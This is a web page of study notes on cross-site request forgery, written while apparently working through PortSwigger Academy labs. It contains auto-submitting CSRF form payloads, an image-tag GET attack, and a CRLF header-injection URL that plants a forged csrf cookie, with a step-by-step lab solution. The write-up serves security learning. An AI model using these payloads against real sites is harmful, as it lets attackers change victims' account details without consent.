[Home](/) | [Showcase](/showcase/) | [Notes](/notes/)
# PortSwigger Academy Notes

## CSRF
## The delivery mechanisms for cross-site request forgery attacks are essentially the same as for reflected XSS. 
- If the request to change email address can be performed with the GET method, then a self-contained attack would look like this:
- ` <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net"> `
To craft an HTML PoC for CSRF, there are online generators to use that will take a post request and convert it to an HTML payload.
Here is an example
```
 <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>'
```
## Common defences against CSRF
* CSRF Tokens: When issuing a request to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token. Otherwise, the server will refuse to perform the requested action. A common way to share CSRF tokens with the client is to include them as a hidden parameter in an HTML form, for example:
```
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>
```
```
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Length: 70
Content-Type: application/x-www-form-urlencoded

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```
#Typical CSRF Payload
```
<html>
	<body>
		<form method="POST" action="https://0a8e000104e947029abef873003800d6.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="zeus&#x40;hope.net"/>
			<input type="hidden" name="csrf" value="rv3CmHWB7WhZvUkK4ABMenNmAi3v8mJg"/>
			<input type="submit" value="Submit">
		</form>
 <script>
    document.forms[0].submit();
 </script>
	</body>
<html>
```
 
### CSRF Token Flaws
Validation of CSRF token depends on request method
1. Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.
     * Change request to potentially bypass check
2. Some applications correctly validate the token when it is present but skip the validation if the token is omitted.
     * Remove the csrf parameter in the request to potentially bypass check
3. Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.
     * Use your own token from your own attack to access a victims account
4.  some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together.
     * If the website contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible.
     * The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.
     * You try to inject your csrf token and csrf key into the victims browser, but not the session token in the cookie, since its not tied together.
     * Test if manipulating session token affects the response vs. the CSRF key in the cookie. "Invalid csrf token" "Invalid session".
5. CSRF token is simply duplicated in a cookie. Some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie.
     * Example
```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```
   * the attacker can again perform a CSRF attack if the website contains any cookie setting functionality. Here, the attacker doesn't need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.

1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that the value of the csrf body parameter is simply being validated by comparing it with the csrf cookie.
3. Perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.
4. Create a URL that uses this vulnerability to inject a fake csrf cookie into the victim's browser:
```
    /?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
```
5. Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab, ensuring that your CSRF token is set to "fake". The exploit should be created from the email change request.
6. Remove the auto-submit <script> block and instead add the following code to inject the cookie and submit the form:
```
    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```
7. Change the email address in your exploit so that it doesn't match your own.
8. Store the exploit, then click "Deliver to victim" to solve the lab.




* SameSite Cookies
* Referer-Based Validation

